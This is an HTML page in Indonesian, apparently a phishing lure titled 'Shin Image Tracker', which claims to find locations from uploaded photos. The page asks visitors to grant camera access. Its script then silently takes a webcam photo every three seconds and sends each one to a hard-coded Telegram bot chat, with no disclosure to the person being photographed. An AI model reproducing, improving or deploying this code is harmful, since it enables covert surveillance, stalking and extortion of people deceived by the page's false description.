<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Tracker</title>
    <meta property="og:title" content="Shin Image Tracker" />
    <meta property="og:description" content="Lacak Lokasi Dengan Foto." />
    <meta property="og:image" content="https://telegra.ph/file/8182efdb2415a8e717d9e.jpg" />
    <meta property="og:url" content="https://shin-tracker.vercel.app" />
    <style>
        /* CSS untuk tata letak */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
        }
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 20px;
            background-color: #fff;
            margin: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .image {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
        }
        .title {
            font-size: 24px;
            color: #333;
            font-family: Georgia, serif;
            text-align: center;
        }
        .jd {
            font-size: 18px;
            color: #666;
            text-align: center;
            line-height: 1.6;
        }
        #video-container {
            max-width: 100%;
            margin: 20px;
        }
        #video-container img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        #video-container p {
            font-size: 16px;
            color: #888;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://telegra.ph/file/32fc804a4917abd24284f.jpg" alt="Logo Shin Image Tracker" class="image">
        <h1 class="title">Shin Image Tracker</h1>
    </div>
    <div id="video-container">       
        <img src="https://telegra.ph/file/7b755c6b85a3ea922ce44.jpg" alt="Tracker Gambar" width="320px">
        <p class="jd">Lacak lokasi hanya dengan mengunggah foto, izinkan akses kamera untuk mengoptimalkan pelacakan agar sesuai dan tepat. Jika masih ada masalah, silakan hubungi layanan pelanggan kami.</p>
    </div>
    <script>
        // JavaScript untuk pengambilan foto dan pengiriman ke Telegram
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        const chatId = '7056220365';
        const botToken = '';

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setInterval(() => takePhotoAndSend(video), 3000);
            })
            .catch(err => {
                console.error('Error accessing webcam: ', err);
            });

        function takePhotoAndSend(video) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'selfie.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (!data.ok) {
                        console.error('Error sending photo to Telegram:', data.description);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
